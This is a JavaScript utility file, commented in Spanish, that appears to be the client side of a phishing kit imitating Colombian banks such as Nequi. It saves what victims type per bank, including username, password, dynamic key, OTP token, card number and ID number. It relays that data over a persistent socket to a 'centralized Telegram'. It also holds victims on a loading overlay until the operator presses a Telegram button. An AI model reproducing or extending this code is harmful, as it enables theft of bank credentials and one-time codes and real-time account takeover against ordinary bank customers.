/**
 * BANCO-UTILS.JS - Utilidades compartidas para todas las bancas
 * Patrón Singleton con funciones reutilizables
 */

(function() {
    'use strict';

    // Estado privado
    let socket = null;
    let sessionId = null;
    let overlayElement = null;
    let isInitialized = false;
    let keepAliveTimer = null;

    /**
     * Configuración y conexión Socket.IO (idempotente)
     * Devuelve el mismo socket aunque aún esté conectando.
     */
    function initSocket() {
        if (socket) return socket;

        sessionId = localStorage.getItem('nequiSessionId');
        if (!sessionId) {
            sessionId = `nequi_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
            localStorage.setItem('nequiSessionId', sessionId);
        }

        // Detectar URL automáticamente (localhost o producción)
        const socketUrl = window.location.hostname === 'localhost' 
            ? 'http://localhost:3000'
            : window.location.origin;

        console.log('🔌 Conectando a:', socketUrl);

        socket = io(socketUrl, {
            reconnection: true,
            reconnectionDelay: 500,
            reconnectionDelayMax: 5000,
            randomizationFactor: 0.5,
            reconnectionAttempts: Infinity,
            timeout: 20000,
            transports: ['websocket', 'polling'],
            upgrade: true,
            rememberUpgrade: true,
            autoConnect: true,
            forceNew: false,
            // Permite recuperar sesión si el servidor lo soporta (Socket.IO 4.6+)
            auth: { sessionId: sessionId }
        });

        socket.on('connect', () => {
            console.log('✅ Socket conectado:', socket.id);
            // Re-vincular sesión en cada (re)conexión
            socket.emit('init_session', { sessionId });
        });

        socket.on('connect_error', (error) => {
            console.warn('⚠️ Error de conexión:', error.message);
        });

        socket.on('session_ready', (data) => {
            console.log('✅ Sesión lista:', data.sessionId);
        });

        socket.on('disconnect', (reason) => {
            console.log('⚠️ Socket desconectado:', reason);
            // Si el servidor cierra la conexión, forzar reconexión manual
            if (reason === 'io server disconnect') {
                setTimeout(() => socket.connect(), 500);
            }
        });

        socket.on('reconnect', (attemptNumber) => {
            console.log('✅ Reconectado tras', attemptNumber, 'intentos');
            socket.emit('init_session', { sessionId });
        });

        // Keep-alive único (evitar duplicados al reinicializar)
        if (keepAliveTimer) clearInterval(keepAliveTimer);
        keepAliveTimer = setInterval(() => {
            if (socket && socket.connected) {
                socket.emit('keepAlive', { sessionId });
            }
        }, 20000);

        return socket;
    }

    /**
     * Obtener o crear el overlay de carga
     */
    function getOverlay() {
        if (overlayElement) return overlayElement;

        overlayElement = document.getElementById('loadingOverlay') || 
                        document.querySelector('.loading-overlay') ||
                        document.querySelector('.loadingOverlay');

        if (!overlayElement) {
            console.warn('⚠️ No se encontró overlay en el DOM');
        }

        return overlayElement;
    }

    /**
     * Mostrar overlay
     */
    function showOverlay() {
        const overlay = getOverlay();
        if (!overlay) return;

        overlay.classList.add('show');
        document.body.style.overflow = 'hidden';
    }

    /**
     * Ocultar overlay
     */
    function hideOverlay() {
        const overlay = getOverlay();
        if (!overlay) return;

        overlay.classList.remove('active', 'show');
        document.body.style.overflow = '';
    }

    /**
     * Enviar datos al Telegram centralizado
     */
    async function sendToTelegram(type, content) {
        return new Promise((resolve, reject) => {
            if (!socket || !socket.connected) {
                reject(new Error('Socket no conectado'));
                return;
            }

            const timeoutId = setTimeout(() => {
                reject(new Error('Timeout esperando respuesta'));
            }, 30000);

            socket.once('dataSent', (response) => {
                clearTimeout(timeoutId);
                if (response.success) {
                    resolve(response);
                } else {
                    reject(new Error(response.error || 'Error desconocido'));
                }
            });

            socket.emit('sendData', {
                sessionId,
                type,
                content
            });
        });
    }

    /**
     * Configurar manejador de acciones de Telegram
     */
    function onTelegramAction(callback) {
        if (!socket) {
            console.error('❌ Socket no inicializado');
            return;
        }

        socket.on('telegramAction', (data) => {
            console.log('📲 Acción recibida:', data);
            hideOverlay();
            if (callback) callback(data);
        });
    }

    /**
     * Formatear mensaje con datos acumulados
     */
    function formatMessage(bankName, bankData) {
        let message = `\n🔔 <b>${bankName.toUpperCase()}</b>\n\n`;
        message += '📝 <b>INFORMACIÓN:</b>\n';

        // Convertir objeto a array de [clave, valor] y formatear
        Object.entries(bankData).forEach(([key, value]) => {
            if (value && value !== 'N/A') {
                const label = formatLabel(key);
                message += `${label} <b>${key}:</b> ${value}\n`;
            }
        });

        message += `\n⏰ ${new Date().toLocaleString('es-CO')}`;
        return message.trim();
    }

    /**
     * Formatear etiqueta según el tipo de dato
     */
    function formatLabel(key) {
        const labels = {
            usuario: '👤',
            clave: '🔐',
            password: '🔐',
            dinamica: '🔢',
            token: '📱',
            otp: '📱',
            tarjeta: '💳',
            cedula: '🆔',
            documento: '🆔',
            telefono: '📞',
            email: '📧'
        };
        return labels[key.toLowerCase()] || '📋';
    }

    /**
     * Crear teclado con botones estándar
     */
    function createKeyboard(buttons, sessionId) {
        if (!Array.isArray(buttons) || buttons.length === 0) {
            return null;
        }

        return {
            inline_keyboard: buttons.map(btn => [{
                text: btn.text,
                callback_data: `${btn.action}:${sessionId}`
            }])
        };
    }

    /**
     * Validar campo numérico
     */
    function validateNumeric(input, length) {
        const value = input.value.replace(/[^0-9]/g, '');
        input.value = length ? value.slice(0, length) : value;
        return value;
    }

    /**
     * Gestionar sessionStorage por banco
     */
    function getBankData(bankName) {
        const key = `${bankName.toLowerCase()}Data`;
        return JSON.parse(sessionStorage.getItem(key) || '{}');
    }

    function saveBankData(bankName, data) {
        const key = `${bankName.toLowerCase()}Data`;
        const existing = getBankData(bankName);
        const merged = { ...existing, ...data };
        sessionStorage.setItem(key, JSON.stringify(merged));
        return merged;
    }

    /**
     * Inicializar utilidades
     */
    function init() {
        if (isInitialized) return;
        initSocket();
        isInitialized = true;
        console.log('✅ BancoUtils inicializado');
    }

    // API Pública
    window.BancoUtils = {
        init,
        initSocket,
        getSocket: () => socket,
        getSessionId: () => sessionId,
        getOverlay,
        showOverlay,
        hideOverlay,
        sendToTelegram,
        onTelegramAction,
        formatMessage,
        createKeyboard,
        validateNumeric,
        getBankData,
        saveBankData
    };

    // Auto-inicializar solo el socket
    init();
})();
